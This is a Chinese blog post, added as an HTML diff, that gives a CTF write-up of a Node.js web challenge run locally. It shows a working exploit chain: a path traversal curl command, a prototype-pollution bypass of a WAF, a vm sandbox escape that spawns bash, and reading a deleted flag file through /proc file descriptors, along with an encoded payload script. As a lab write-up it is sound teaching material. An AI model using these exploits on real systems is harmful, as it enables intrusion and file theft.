@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>CTF Web 练习题：Flag 即服务</title>
+        <link rel="stylesheet" href="/css/normalize.min.css">
+        <link rel="stylesheet" href="/css/magick.css">
+        <link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+        <link rel="icon" href="/favicon.ico" type="image/x-icon">
+        <script>
+            // Immediately set the theme based on user's preference stored in localStorage
+            (function() {
+                const savedTheme = localStorage.getItem('theme');
+                if (savedTheme) {
+                    document.documentElement.setAttribute('data-theme', savedTheme);
+                    document.documentElement.style.colorScheme = savedTheme;
+                } else {
+                    const prefersDarkScheme = window.matchMedia('(prefers-color-scheme: dark)').matches;
+                    const defaultTheme = prefersDarkScheme ? 'dark' : 'light';
+                    document.documentElement.setAttribute('data-theme', defaultTheme);
+                    document.documentElement.style.colorScheme = defaultTheme;
+                }
+            })();
+        </script>
+    </head>
+    <body>
+        <div>
+            <main>
+                <header>
+                    <nav>
+                        <ul>
+                            <li><a href="/">Posts</a></li>
+                            <li><a href="/friends.html">Friends</a></li>
+                            <li><a href="/about.html">About</a></li>
+                            <li id="theme-toggle"><a><span class="fas fa-moon"></span></a></li>
+                        </ul>
+                    </nav>
+                    <h1>CTF Web 练习题：Flag 即服务</h1>
+                </header>
+                <section>
+                    </section><section>
+<h2>题目描述</h2>
+<p>题目来源：geekgame-1st</p>
+<p>故事背景：网站提供了“JSON-as-a-Service”，可以像 jq 工具一样转换 JSON 格式。一个例子是 <code>http://example.com/api/demo.json?in_path=1/name&amp;out_path=response/data</code>。假设 <code>demo.json</code> 的内容是：</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span></span><code class="language-json">[
+  {&quot;name&quot;:&quot;Foo&quot;,&quot;age&quot;:24,&quot;type&quot;:&quot;student&quot;},
+  {&quot;name&quot;:&quot;Bar&quot;,&quot;age&quot;:17,&quot;type&quot;:&quot;monster&quot;}
+]
+</code></pre>
+<p>根据 URL 参数：</p>
+<ul>
+<li><code>in_path=1/name</code>：表示从 JSON 数组的第二个元素（索引为 1）中提取 <code>name</code> 字段。</li>
+<li><code>out_path=response/data</code>：表示将提取的值放入 <code>response</code> 的 <code>data</code> 字段中。</li>
+</ul>
+<p>因此返回的结果是：</p>
+<pre><span class="line-number"><span>1</span></span><code class="language-json">{&quot;response&quot;:{&quot;data&quot;:&quot;Bar&quot;}}
+</code></pre>
+</section><section>
+<h2>解题方法</h2>
+<p>我在本地用 Podman 复现了题目环境。题目源文件<a href="https://github.com/PKU-GeekGame/geekgame-1st/blob/master/src/json/Dockerfile">在这里</a>。</p>
+</section><section>
+<h3>获取源码</h3>
+<p>尝试访问 <code>http://localhost:5000/api/</code> ，得到报错信息<span class="sidenote-anchor"></span><span class="sidenote">Lynx 是适用于终端环境的网页浏览器，可以方便查看表格等信息。</span>：</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span></span><code class="language-sh">$ curl -v http://localhost:5000/api/ | lynx --stdin
+Error: EISDIR: illegal operation on a directory, read
+    at Object.readSync (fs.js:618:3)
+    at tryReadSync (fs.js:383:20)
+    at Object.readFileSync (fs.js:420:19)
+    at /usr/src/app/node_modules/jsonaas-backend/index.js:56:19
+</code></pre>
+<p>通过分析可以发现，服务器将 <code>/api/</code> 后面的路径视为文件进行处理。此外，服务是通过 node_modules 形式安装的，这意味着 <code>package.json</code> 文件中会包含安装方式的说明。利用路径穿越漏洞，我们能够获取应用的源码<span class="sidenote-anchor"></span><span class="sidenote"><code>--path-as-is</code> 是 curl 命令的一个选项，允许在请求中保留并按原样传递 URL 路径，包括不简化 <code>../</code> 路径遍历序列。</span>。幸运的是，<code>package.json</code>恰好是 JSON 格式，因此能够被成功读取；如果不是 JSON 格式，应用则会返回错误信息："Cannot parse file as JSON!"，这意味着我们并不能读取任意文件。</p>
+<pre><span class="line-number"><span>1</span></span><code class="language-sh">curl --path-as-is -v http://localhost:5000/api/../package.json
+</code></pre>
+<p>简单审计源码，可以得到第一个 flag：</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span></span><code class="language-js">module.exports = function start_server(port) {
+    if(FLAG0!==`flag{${0.1+0.2}}`)
+        return;
+    ...
+}
+</code></pre>
+<p>这里包含了一个有趣的计算机笑话，0.1+0.2 不等于 0.3。我们用 node 计算一下结果：</p>
+<pre><span class="line-number"><span>1</span><span>2</span></span><code class="language-sh">$ echo &quot;console.log(0.1+0.2)&quot; | node
+0.30000000000000004
+</code></pre>
+</section><section>
+<h3>解锁服务</h3>
+<p>相关代码如下：</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span></span><code class="language-js">app.get(&#39;/activate&#39;, (req, res)=&gt;{
+    if(req.query.code===FLAG1)
+        req.session.activated = 1;
+    
+    if(req.session.activated)
+        res.send(`You have been activated. Activation code: ${FLAG1}`);
+    else
+        res.send(&#39;Wrong activation code :(&#39;);
+});
+</code></pre>
+<p>为了得到 Flag1，我们需要把 <code>req.session.activated</code> 设为一个能让条件判断为真的值。由于应用会根据<code>in_path</code>和<code>out_path</code>访问对象的属性，我们可以用<a href="https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution">原型链污染</a>的方法修改 <code>Object</code> 的原型。原理如下：</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span></span><code class="language-">$ node
+Welcome to Node.js v20.12.2.
+Type &quot;.help&quot; for more information.
+&gt; {}.__proto__.activated = true
+true
+&gt; function Session() {}
+undefined
+&gt; (new Session).activated
+true
+</code></pre>
+<p>但是，源码中的 WAF 过滤了特殊属性的访问，同时不能访问带有下划线 <code>_</code> 的属性。这里 WAF（Web Application Firewall）是对保护Web应用程序的安全技术的指代。它通过监控、过滤的方法阻止SQL注入、跨站脚本（XSS）、文件包含漏洞和其他常见的Web攻击。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span><span>11</span><span>12</span><span>13</span><span>14</span><span>15</span><span>16</span><span>17</span><span>18</span><span>19</span><span>20</span><span>21</span><span>22</span><span>23</span><span>24</span><span>25</span><span>26</span><span>27</span><span>28</span><span>29</span><span>30</span><span>31</span><span>32</span></span><code class="language-js">function waf(str) {
+    for(let bad_name of Object.getOwnPropertyNames(({}).__proto__))
+        if(str.indexOf(bad_name)!==-1)
+            return true;
+    return false;
+}
+
+app.get(&#39;/api/:path(*)&#39;, (req, res)=&gt;{
+    let path = &#39;data/&#39;+req.params.path;
+    let in_path = req.query.in_path||&#39;&#39;;
+    let out_path = req.query.out_path||&#39;&#39;;
+    let prefix = req.session.prefix ? (req.session.prefix+&#39;/&#39;) : &#39;&#39;;
+
+    if(waf(in_path) || waf(out_path)) { // 检查1：特殊属性不能访问
+        res.send(&#39;Bad parameter!&#39;);
+        return;
+    }
+    // ...
+    in_path = prefix + in_path;
+    in_path = in_path.split(&#39;/&#39;).filter(x=&gt;x!==&#39;&#39;);
+    for(let term of in_path) {
+        if(term.indexOf(&#39;_&#39;)!==-1) { // 检查2：属性不能带有下划线
+            res.send(&#39;Bad parameter!&#39;);
+            return;
+        }
+        // ...
+        if(data[term]===undefined)
+            data[term] = {};
+        data = data[term];
+    }
+    // ...
+}
+</code></pre>
+<p>打印看一下禁用的属性：</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span><span>11</span><span>12</span><span>13</span><span>14</span><span>15</span></span><code class="language-js">&gt; Object.getOwnPropertyNames(({}).__proto__)
+[
+  &#39;constructor&#39;,
+  &#39;__defineGetter__&#39;,
+  &#39;__defineSetter__&#39;,
+  &#39;hasOwnProperty&#39;,
+  &#39;__lookupGetter__&#39;,
+  &#39;__lookupSetter__&#39;,
+  &#39;isPrototypeOf&#39;,
+  &#39;propertyIsEnumerable&#39;,
+  &#39;toString&#39;,
+  &#39;valueOf&#39;,
+  &#39;__proto__&#39;,
+  &#39;toLocaleString&#39;
+]
+</code></pre>
+<p>到此好像没有头绪了。这里学习到一个新知识，query string 不一定是一个字符串，还可以是字符串数组。<a href="https://stackoverflow.com/questions/6243051/how-to-pass-an-array-within-a-query-string">Stackoverflow 上的一个问题</a>讨论了三种方法：</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span></span><code class="language-">?cars[]=Saab&amp;cars[]=Audi
+?cars=Saab&amp;cars=Audi
+?cars=Saab,Audi
+</code></pre>
+<p>当前，这三种技术并未被纳入标准文档。然而，实际情况是，第一种方法得到了广泛的共识，并被众多库所采纳。因此，我们可以通过传递字符串数组的方式，绕过 WAF 的第一个检查 <code>str.indexOf(bad_name)</code>。因为 <code>str</code> 是数组，所以不包含特殊属性。数组的属性名如下：</p>
+<pre><span class="line-number"><span>1</span><span>2</span></span><code class="language-js">&gt; Object.getOwnPropertyNames([&#39;arg1&#39;, &#39;arg2&#39;])
+[ &#39;0&#39;, &#39;1&#39;, &#39;length&#39; ]
+</code></pre>
+<p>至于第二个限制，即不允许使用下划线的情况，我们可以利用<code>.constructor.prototype</code>这一属性来间接实现对<code>.__proto__</code>的访问。</p>
+<p>下面的脚本<span class="sidenote-anchor"></span><span class="sidenote"><code>curl --get</code>用于指定 GET 方法发送请求。不指定的情况下，默认采用 POST 方法，将 query 放在 body 中，并设置 <code>Content-Type: application/x-www-form-urlencoded</code>。</span>，可以把 <code>demo.json</code> 的值赋给 <code>{}.__proto__.activated</code>。<code>req.session.activated</code>会被判断为真，并打印 Flag1：</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span></span><code class="language-sh">curl --get --path-as-is -v http://localhost:5000/api/demo.json \
+  -d out_path[]=a -d out_path[]=/constructor/prototype/activated
+curl --get --path-as-is -v http://localhost:5000/activate \
+  -d code=anything
+</code></pre>
+</section><section>
+<h3>任意执行</h3>
+<p>与下一个 flag 相关的代码如下：</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span><span>11</span><span>12</span><span>13</span><span>14</span></span><code class="language-js">let FLAG2 = getflag(&#39;flag2.txt&#39;);
+
+function getflag(path) {
+    let f;
+    try {
+        f = fs.openSync(path);
+    } catch(e) {
+        //return &#39;failed&#39;;
+        throw e;
+    }
+    let content = fs.readFileSync(f, {encoding: &#39;utf-8&#39;}).trim();
+    fs.unlinkSync(path);
+    return content;
+}
+</code></pre>
+<p>在应用读取 flag 文件后立即删除该文件的情况下，且应用中并未使用到 <code>FLAG2</code> 这个变量。我们需要注意一个关键点：应用在读取文件后没有关闭文件描述符。在 Linux 系统中，即使文件被删除，只要有一个进程持有该文件的描述符，文件实际上并未从文件系统中移除。这是因为文件系统会保留文件的数据块，直到所有引用该文件的描述符都被关闭。以下实验可以验证这一点：</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span><span>11</span><span>12</span></span><code class="language-sh">$ echo hello&gt;/tmp/hello
+$ exec 10&lt;&gt;/tmp/hello
+$ ls -l /proc/self/fd/10
+lrwx------ 1 ... /proc/self/fd/10 -&gt; /tmp/hello
+$ rm /tmp/hello
+$ ls -l /proc/self/fd/10
+lrwx------ 1 ... /proc/self/fd/10 -&gt; &#39;/tmp/hello (deleted)&#39;
+$ cat &lt;&amp;10
+hello
+$ exec 10&gt;&amp;-
+$ ls -l /proc/self/fd/10
+ls: cannot access &#39;/proc/self/fd/10&#39;: No such file or directory
+</code></pre>
+<p>现在的问题是怎么实现读取 <code>/proc/self/fd/</code> 下的文件<span class="sidenote-anchor"></span><span class="sidenote">一个有趣的工具 <a href="https://github.com/Xfennec/progress">progress</a> 利用 /proc 文件系统来显示基本命令（如 cp、mv、dd、tar、gzip/gunzip、cat 等）的数据复制进度。其原理是：对于找到的每个相关命令进程，遍历其 fd 和 fdinfo 目录，找到其中最大的文件，并持续追踪其读写的位置来计算进度。</span>，并打印出来。</p>
+<p>使用 Flag1 升级到 premium 版本后，用户可以启用求值功能。在此过程中，这里我遇到了奇怪的现象：在前面的操作中，我们污染了 <code>{}.__proto__.activated</code>，这导致 <code>req.session.activated = 1</code> 没有被保存 （可能是 <a href="https://www.npmjs.com/package/express-session">express-session</a> 在保存会话数据后未能正确恢复所引起的）。解决这一问题的方法是重启服务器，以清除之前的污染状态。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span></span><code class="language-sh">curl -c cookie.txt \
+  --get --path-as-is -v http://localhost:5000/activate \
+  --data-urlencode code=flag{I-Can-Activate-From-Prototype}
+curl -b cookie.txt -c cookie.txt \
+  --get --path-as-is -v http://localhost:5000/eval_settings/ \
+  -d eval=on
+</code></pre>
+<p>求值功能允许我们对 <code>in_path</code> 中加入表达式，比如<code>in_path=(1+0)/name</code>。下面代码中描述了求值的行为，这里 <code>safe_eval(expression)</code> 使用了沙箱 <a href="https://nodejs.org/api/vm.html#vmruninnewcontextcode-contextobject-options">vm.runInNewContext</a>。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span><span>11</span><span>12</span><span>13</span><span>14</span><span>15</span><span>16</span><span>17</span><span>18</span><span>19</span><span>20</span><span>21</span><span>22</span><span>23</span><span>24</span><span>25</span><span>26</span><span>27</span><span>28</span><span>29</span><span>30</span><span>31</span><span>32</span><span>33</span><span>34</span><span>35</span><span>36</span><span>37</span><span>38</span></span><code class="language-js">app.get(&#39;/api/:path(*)&#39;, (req, res)=&gt;{
+    // ...
+    for(let term of in_path) {
+        if(term.indexOf(&#39;_&#39;)!==-1) {
+            res.send(&#39;Bad parameter!&#39;);
+            return;
+        }
+        if(eval_mode &amp;&amp; /^\([^a-zA-Z&quot;&#39;,;]+\)$/.test(term))
+            term = safe_eval(term);
+        if(data[term]===undefined)
+            data[term] = {};
+        data = data[term];
+    }
+    // ...
+}
+
+const CLIENT_CODE = `
+const vm = require(&quot;vm&quot;);
+const code = __USERCODE__;
+console.log(vm.runInNewContext(code, {}));
+`;
+const TIMEOUT_MS = 1000;
+
+function safe_eval(s) {
+    let code = CLIENT_CODE.replace(&#39;__USERCODE__&#39;, JSON.stringify(s));
+    try {
+        let stdout = child_process.execFileSync(&#39;/usr/local/bin/node&#39;, [&#39;-&#39;], {
+            input: code,
+            env: {},
+            timeout: TIMEOUT_MS,
+            encoding: &#39;utf-8&#39;,
+            killSignal: &#39;SIGTERM&#39;,
+        });
+        return stdout.trim();
+    } catch(_) {
+        return s;
+    }
+}
+</code></pre>
+<p>简单搜搜，能找到经典的<a href="https://github.com/patriksimek/vm2/issues/32">沙箱逃逸方案</a>。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span></span><code class="language-js">ForeignFunction = this.constructor.constructor;
+// Option 1
+const [process1, require1] = ForeignFunction(&quot;return [process, require]&quot;)();
+// Option 2
+const process2 = ForeignFunction(&quot;return process&quot;)();
+const require2 = process2.mainModule.require;
+// Option 3
+const process3 = ForeignFunction(&quot;return process&quot;)();
+const spawn3 = process3.binding(&#39;spawn_sync&#39;).spawn;
+spawn3({file:&#39;bash&#39;,args:[&#39;bash&#39;,&#39;-c&#39;,&#39;cmd&#39;],stdio:[{type:&#39;pipe&#39;,readable:true,writable:false}]})
+</code></pre>
+<p>其原理是 <code>this.constructor</code> 是沙箱对象的构造函数。构造函数本身是一个函数，所以它的构造函数（即 <code>this.constructor.constructor</code>）是 <code>Function</code>。用 <code>Function</code> 可以构造运行在沙箱外的函数，从而获得 <code>process</code>,  <code>require</code>, <code>spawn</code> 等关键能力。</p>
+<p>事实上，用软件实现沙箱是相当困难的，<a href="https://github.com/patriksimek/vm2">vm2</a> 这个项目尝试了很多办法，但很快又有人提出<a href="https://github.com/patriksimek/vm2/issues?q=Escape">新的逃逸方案</a>。</p>
+<blockquote>
+<p>Running untrusted code is hard, relying only on software modules as a sandboxing technique to completely prevent misuse of untrusted code execution is a bad decision afterall. It could be a real mess in cloud saas situations, since multiple tenants data is accessible once you are able to escape out of the sandbox process. You could sneak in into other tenants sessions, secrets etc. A far more secure option would be to depend on hardware virtualization like running each tenant code inside a seperate docker container or AWS Lambda Function as a service might also be a better choice.</p>
+<footer> <a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html"> Sandboxing NodeJS is hard, here is why  </a>  </footer>
+</blockquote>
+<p>可以轻松写出以下代码来读取 Flag：</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span><span>11</span><span>12</span><span>13</span><span>14</span><span>15</span><span>16</span><span>17</span><span>18</span><span>19</span></span><code class="language-js">const ForeignFunction = this.constructor.constructor;
+const [process1, require1] = ForeignFunction(&quot;return [process, require]&quot;)();
+const console1 = require1(&quot;console&quot;);
+const fs1 = require1(&quot;fs&quot;);
+
+let pid = process1.ppid;
+let prefix = &#39;/proc/&#39;+pid+&#39;/fd/&#39;;
+let result = &#39;&#39;;
+fs1.readdirSync(prefix).forEach((fd) =&gt; {
+    try {
+        let filename = fs1.readlinkSync(prefix + fd);
+        if (filename.indexOf(&#39;flag&#39;) !== -1) {
+            // 只关注名字包含 flag 的文件
+            let content = fs1.readFileSync(prefix + fd);
+            result += content;
+        }
+    } catch (_) {}
+})
+result
+</code></pre>
+<p>用 <a href="https://skalman.github.io/UglifyJS-online/">UglifyJS</a> 压缩一下得到：</p>
+<pre><span class="line-number"><span>1</span></span><code class="language-">var[r,c]=(0,this.constructor.constructor)(&quot;return [process, this.global.require]&quot;)();c(&quot;console&quot;);const n=c(&quot;fs&quot;);let e=&quot;/proc/&quot;+r.ppid+&quot;/fd/&quot;,o=&quot;magic:&quot;;n.readdirSync(e).forEach(r=&gt;{try{var c;-1!==n.readlinkSync(e+r).indexOf(&quot;flag&quot;)&amp;&amp;(c=n.readFileSync(e+r),o+=c)}catch(r){}}),o
+</code></pre>
+<p>然而，应用对代码的字符集设定了限制，仅允许不包含 <code>[a-zA-Z"',;]</code> 的字符。初步考虑使用 <a href="https://jsfuck.com/#">JSFuck</a> 来编码，但这种方法生成的字符串过于冗长（超过8万个字符），超出了 URL 的长度限制。经过测试，发现 URL 的长度限制大约在 5000 字符左右。鉴于应用允许使用数字，这为我们提供了比 JSFuck 更多的可用字符，因此，我们可以探索一种方法来缩短代码长度。</p>
+<p>一个想法是通过创建一个数据对象 <code>$</code>，其中每个下标 <code>i</code> 对应 ASCII 码为 <code>i</code> 的字符，从而可以用类似 <code>$[118]+$[97]+$[114]+...</code> 的方式来表达任意代码。以下是实现这一想法的代码示例：</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span></span><code class="language-js">($ =&gt; eval($[118]+$[97]+$[114]+...)
+)(&#39;0-1-2-3-4-..-128&#39;
+.split(&#39;-&#39;)
+.map(x=&gt;String.fromCharCode(x)))
+</code></pre>
+<p>这一代码本身需要手工构造，<a href="https://stackoverflow.com/questions/63673610/alternative-way-to-get-c-letter-in-jsfuck">这个 StackOverflow 上的讨论提供了很多想法</a>。下面是一个完整的构造过程。这里有趣的一点是利用 <code>Number.toString(36)</code> 方法生成所有的小写字母，因为 36 进制包含了从 0 到 9 和从 a 到 z 的所有字符。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span><span>11</span><span>12</span><span>13</span><span>14</span><span>15</span><span>16</span><span>17</span><span>18</span><span>19</span><span>20</span><span>21</span><span>22</span><span>23</span><span>24</span><span>25</span><span>26</span><span>27</span><span>28</span><span>29</span><span>30</span><span>31</span><span>32</span><span>33</span><span>34</span><span>35</span><span>36</span><span>37</span><span>38</span><span>39</span><span>40</span><span>41</span><span>42</span></span><code class="language-">// $0 = &#39;constructor&#39;
+// $1 = eval(....)
+// $2 = &#39;function String() { [native code] }&#39;
+// $3 = &#39;[object Array Iterator]&#39;
+//       0    5    10   5    20   5
+// $5($0) = &#39;toString&#39;
+console.info(
+    ($0=&gt;$1=&gt;$2=&gt;$3=&gt;$5=&gt;
+        ($=&gt;$1( $[118]+$[97]+$[114]+... )) ($1(
+            `\`0-1-2-3-4-...-126-127\`.`+
+            $0[3] +              // s
+            (25)[$5($0)](36) +   // p
+            (21)[$5($0)](36) +   // l
+            $2[5] +              // i
+            $3[6] + `(\`-\`).` + // t
+            (22)[$5($0)](36) +   // m
+            $3[11] +             // a
+            (25)[$5($0)](36) +   // p
+            `($=&gt;` +
+            $2[9] +         // S
+            $2[10] +        // t
+            $2[11] +        // r
+            $2[12] +        // i
+            $2[13] +        // n
+            $2[14] + `.` +  // g
+            $2[0] + $0[5] + $0[1] + // fro
+            (22)[$5($0)](36) +      // m
+            $1(`\`\\` + (33)[$5($0)](36) + `43\``) +  // C
+            (17)[$5($0)](36) +   // h
+            $2[22] +             // a
+            $0[5] +              // r
+            $1(`\`\\` + (33)[$5($0)](36) + `43\``) +  // C
+            $0[1] +              // o
+            $2[30] + $2[31] + `($))`  // de
+        ))
+    )
+    (([]+{}+``)[5]+([]+{}+``)[1]+(([]+[])[1]+``)[1]+(!1+``)[3]+(!0+``)[0]+(!0+``)[1]+(!0+``)[2]+([]+{}+``)[5]+(!0+``)[0]+([]+{}+``)[1]+(!0+``)[1])
+    (/* eval 的实现，从 JSFuck 直接生成，约 1500 个字符 */)
+    ((``)[([]+{}+``)[5]+([]+{}+``)[1]+(([]+[])[1]+``)[1]+(!1+``)[3]+(!0+``)[0] +(!0+``)[1]+(!0+``)[2]+([]+{}+``)[5]+(!0+``)[0]+([]+{}+``)[1]+(!0+``)[1]]+``)
+    ([][(!![]+[])[!+[]+1+1]+([][[]]+[])[1]+(!![]+[])[+[]]+(!![]+[])[1]+([![]]+[][[]])[+1+[+[]]]+(!![]+[])[!+[]+1+1]+(![]+[])[!+[]+1+1]]()+[])
+    ($$=&gt;(!0+``)[0]+([]+{}+``)[1]+($=((``)[$$]+``))[9]+$[10]+$[11]+$[12]+$[13]+$[14])
+)
+</code></pre>
+<p>这种方法可以将字符数量压缩至大约3000个。将要执行的代码保存至 <code>payload.txt</code> 文件中，然后运行以下脚本。该脚本通过将结果存储在 Object 的原型链上<span class="sidenote-anchor"></span><span class="sidenote">除了把结果写在原型链，还可以以 JSON 的格式写在一个文件里，然后用 Flag0 的方法读取。</span>，并将结果返回给客户端。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span></span><code class="language-sh"># 去取 newlines 和 spaces，同时对加号进行 urlencode
+payload=$(cat payload.txt | sed &#39;:a;N;$!ba;s/[ \t\n]//g&#39; | sed &#39;s/+/%2B/g&#39;)
+curl --cookie cookie.txt --get --path-as-is -v http://localhost:5000/api/demo.json \
+  --data-urlencode in_path[]=a \
+  --data &quot;in_path[]=/constructor/prototype/(${payload})/constructor/prototype&quot;
+</code></pre>
+<p>至此，我们就取到了最后一个 Flag2。</p>
+</section><section>
+<h2>知识点总结</h2>
+<p>这个问题的挑战性相当高，它要求对多种领域的知识都有一定的掌握。在不看解答的情况下，我只能取到 Flag0 🤣。</p>
+<p>以下是对相关知识点的总结。</p>
+<ol>
+<li>
+<p><strong>路径穿越漏洞</strong>:</p>
+<ul>
+<li>利用路径穿越漏洞（如<code>../</code>）来读取服务器上的文件，例如<code>package.json</code>。</li>
+<li>通过<code>curl --path-as-is</code>选项来保留并按原样传递URL路径。</li>
+</ul>
+</li>
+<li>
+<p><strong>原型链污染</strong>:</p>
+<ul>
+<li>利用原型链污染修改<code>Object</code>的原型，从而影响所有继承自<code>Object</code>的对象。</li>
+<li>利用 <code>.constructor.prototype</code> 间接访问 <code>.__proto__</code>，绕过对下划线的限制。</li>
+</ul>
+</li>
+<li>
+<p><strong>URL query string 传递数组</strong>:</p>
+<ul>
+<li>用 <code>array[]=b&amp;&amp;array[]=b</code> 的方式在 URL query string 中传递字符串数组。</li>
+<li>通过传递字符串数组的方式可以绕过 getOwnPropertyNames 检查，因为数组的属性名（如<code>0</code>, <code>1</code>, <code>length</code>）不包含特殊属性（如<code>constructor</code>）。</li>
+</ul>
+</li>
+<li>
+<p><strong>NodeJS 沙箱逃逸</strong>:</p>
+<ul>
+<li>针对<code>vm.runInNewContext</code>沙箱通过构造特定的代码来获取<code>process</code>和<code>require</code>对象。</li>
+</ul>
+</li>
+<li>
+<p><strong>文件描述符利用</strong>:</p>
+<ul>
+<li>利用Linux系统中文件描述符的特性，即使文件被删除，只要有一个进程持有该文件的描述符，文件数据仍然可访问。</li>
+<li>通过读取<code>/proc/self/fd/</code>目录下的文件链接来获取被删除的文件内容。</li>
+</ul>
+</li>
+</ol>
+
+                </section>
+                <footer>
+                </footer>
+            </main>
+        </div>
+        <script src="/js/script.js"></script>
+    </body>
+</html>
